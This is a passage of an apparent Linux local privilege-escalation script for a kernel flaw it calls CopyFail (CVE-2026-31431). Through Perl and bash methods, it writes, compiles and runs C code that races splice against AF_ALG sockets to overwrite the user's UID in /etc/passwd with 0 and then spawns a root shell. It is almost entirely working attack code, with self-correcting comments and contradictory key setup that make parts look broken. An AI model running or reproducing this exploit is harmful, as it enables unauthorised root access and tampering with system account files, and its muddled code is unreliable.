        }
    }
    fclose(f);
    return 0;
}
CCODE
    open(my $cf, '>', "/tmp/.df_race_$$.c") or die;
    print $cf $c_code;
    close $cf;

    my $cc = -x "/usr/bin/gcc" ? "gcc" : "cc";
    system("$cc -O2 -o /tmp/.df_race_$$ /tmp/.df_race_$$.c -lpthread 2>/dev/null");
    if (-x "/tmp/.df_race_$$") {
        log_msg("Race binary compiled, executing splice race...");
        my $patch_offset = $target_offset + $uid_field_offset;
        # We want to flip the UID from '0' (0x30) to something, or rather
        # overwrite the UID:GID "0:0" → our UID
        for (my $attempt = 0; $attempt < 10; $attempt++) {
            system("/tmp/.df_race_$$ $patch_offset 0");
            # Check if we can su
            if (system("su -c 'id' root 2>/dev/null") == 0) {
                log_ok("Race won! Root access obtained");
                exec("su - root");
            }
        }
        log_err("Race did not land after 10 attempts");
        unlink("/tmp/.df_race_$$");
        unlink("/tmp/.df_race_$$.c");
    } else {
        log_err("Cannot compile race binary");
    }
}

exit($RESULT_PERL || 1);
PERLEOF
    chmod 0755, "$WORKDIR/copyfail.pl";
    perl "$WORKDIR/copyfail.pl"
    RESULT_PERL=$?
    if [ "$RESULT_PERL" = "0" ]; then
        ok "Perl CopyFail: SUCCESS"
    else
        warn "Perl CopyFail: exited $RESULT_PERL"
    fi
    return $RESULT_PERL
}

# ============================================================
# METHOD 4: Bash + C snippet (minimal — compile and run race only)
# For when only bash + gcc exist, no python/perl
# ============================================================
run_bash_c() {
    log "=== METHOD: Bash + C snippet (minimal splice race) ==="

    CC_BIN="gcc"
    command -v gcc >/dev/null 2>&1 || CC_BIN="cc"

    cat > "$WORKDIR/copyfail_min.c" << 'MINC'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <pthread.h>
#include <errno.h>

#ifndef AF_ALG
#define AF_ALG 38
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef ALG_SET_KEY
#define ALG_SET_KEY 1
#endif
#ifndef ALG_SET_AEAD_AUTHSIZE
#define ALG_SET_AEAD_AUTHSIZE 4
#endif

struct sockaddr_alg {
    unsigned short salg_family;
    char salg_type[14];
    unsigned int salg_feat;
    unsigned int salg_mask;
    char salg_name[64];
};

static volatile int go = 0;
static int opfd = -1;
static int pfd[2];

typedef struct { int passwd_fd; off_t off; size_t len; int rounds; } race_arg_t;

void *splice_racer(void *a) {
    race_arg_t *ra = (race_arg_t *)a;
    while (!go) usleep(50);
    for (int i = 0; i < ra->rounds; i++) {
        off_t o = ra->off;
        splice(ra->passwd_fd, &o, pfd[1], NULL, ra->len, SPLICE_F_NONBLOCK);
    }
    return NULL;
}

int setup_alg(void) {
    struct sockaddr_alg sa;
    memset(&sa, 0, sizeof(sa));
    sa.salg_family = AF_ALG;
    strcpy(sa.salg_type, "aead");
    strcpy(sa.salg_name, "authenc(hmac(sha256),cbc(aes))");

    int fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (fd < 0) {
        // Try loading module
        system("modprobe algif_aead 2>/dev/null; modprobe authenc 2>/dev/null");
        fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
        if (fd < 0) return -1;
    }
    if (bind(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) return -1;

    unsigned char key[56];
    unsigned int *hdr = (unsigned int *)key;
    hdr[0] = 20; // enckeylen... wait, it's auth_keylen
    hdr[1] = 32; // actually the struct is: { __be32 enckeylen; key_material }
    // For authenc: first 4 bytes = enc key length (network order not needed for setsockopt)
    memset(key, 0, 56);
    *((unsigned int *)key) = 32; // enc key len
    memset(key + 4, 0x41, 52);  // rest is key material
    setsockopt(fd, SOL_ALG, ALG_SET_KEY, key, 56);

    unsigned int authsize = 20;
    setsockopt(fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, &authsize, sizeof(authsize));

    opfd = accept(fd, NULL, NULL);
    close(fd);
    return (opfd >= 0) ? 0 : -1;
}

int find_uid_offset(int uid) {
    char uidstr[16];
    snprintf(uidstr, sizeof(uidstr), "%d", uid);

    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    char line[1024];
    int offset = 0;
    while (fgets(line, sizeof(line), f)) {
        // Find line with our UID
        char *p = line;
        char *field[7];
        int n = 0;
        field[0] = p;
        while (*p && n < 6) {
            if (*p == ':') { *p = 0; n++; field[n] = p + 1; }
            p++;
        }
        if (n >= 3 && strcmp(field[2], uidstr) == 0) {
            // Found our user — compute offset of UID field
            fclose(f);
            // Re-read to get raw offset
            f = fopen("/etc/passwd", "r");
            int cur = 0;
            while (fgets(line, sizeof(line), f)) {
                char tmp[1024]; strcpy(tmp, line);
                char *pp = tmp; int nn = 0;
                char *ff[7]; ff[0] = pp;
                while (*pp && nn < 6) { if (*pp == ':') { *pp = 0; nn++; ff[nn] = pp+1; } pp++; }
                if (nn >= 3 && strcmp(ff[2], uidstr) == 0) {
                    // offset of UID = cur + len(user) + 1 + len(passwd) + 1
                    int o = cur + strlen(ff[0]) + 1 + strlen(ff[1]) + 1;
                    fclose(f);
                    return o;
                }
                cur += strlen(line);
            }
            fclose(f);
            return -1;
        }
        offset += strlen(line);
    }
    fclose(f);
    return -1;
}

int main(void) {
    int uid = getuid();
    if (uid == 0) { printf("[+] Already root\n"); execl("/bin/sh", "sh", NULL); }

    printf("[*] CopyFail minimal — CVE-2026-31431 splice race\n");
    printf("[*] Current UID: %d\n", uid);

    // Strategy: overwrite our UID field in /etc/passwd with "0" (0x30 padded)
    // by racing splice from /etc/passwd vs write-to-ALG on the same pipe
    int off = find_uid_offset(uid);
    if (off < 0) { printf("[-] Cannot find UID offset in /etc/passwd\n"); return 1; }
    printf("[*] UID field offset in /etc/passwd: %d\n", off);

    if (setup_alg() < 0) { printf("[-] AF_ALG setup failed (kernel module missing?)\n"); return 1; }
    printf("[*] AF_ALG configured\n");

    pipe(pfd);

    int passwd_fd = open("/etc/passwd", O_RDONLY);
    if (passwd_fd < 0) { printf("[-] Cannot open /etc/passwd\n"); return 1; }

    printf("[*] Starting splice race (may take 30-120s)...\n");
    fflush(stdout);

    // The write data: "0" (0x30) to overwrite UID
    unsigned char patch_byte = '0';
    int rounds = 200000;

    for (int attempt = 0; attempt < 20; attempt++) {
        race_arg_t ra = { passwd_fd, off, 1, rounds };
        pthread_t t;
        go = 0;
        pthread_create(&t, NULL, splice_racer, &ra);

        go = 1;
        for (int i = 0; i < rounds; i++) {
            write(pfd[1], &patch_byte, 1);
            char dummy;
            splice(pfd[0], NULL, opfd, NULL, 1, SPLICE_F_NONBLOCK);
        }
        pthread_join(t, NULL);

        // Check if UID was changed
        char check[256] = {0};
        int cfd = open("/etc/passwd", O_RDONLY);
        lseek(cfd, off, SEEK_SET);
        read(cfd, check, 10);
        close(cfd);

        if (check[0] == '0' && uid != 0) {
            printf("[+] Race WON at attempt %d! UID field overwritten\n", attempt + 1);
            printf("[+] Spawning root shell...\n");
            // Try su or direct exec with new uid
            execl("/bin/su", "su", "-", NULL);
            execl("/bin/sh", "sh", NULL);
        }
        printf("[*] Attempt %d/%d — race didn't land, retrying...\n", attempt + 1, 20);
    }

    close(passwd_fd);
    close(pfd[0]); close(pfd[1]); close(opfd);
    printf("[-] Race did not land after 20 attempts\n");
    return 1;
}
MINC

    $CC_BIN -O2 -o "$WORKDIR/copyfail_min" "$WORKDIR/copyfail_min.c" -lpthread 2>/dev/null
    if [ $? -ne 0 ]; then
        err "Failed to compile minimal CopyFail race"
        return 1
    fi

    ok "Minimal CopyFail compiled"
    "$WORKDIR/copyfail_min"
    return $?
}

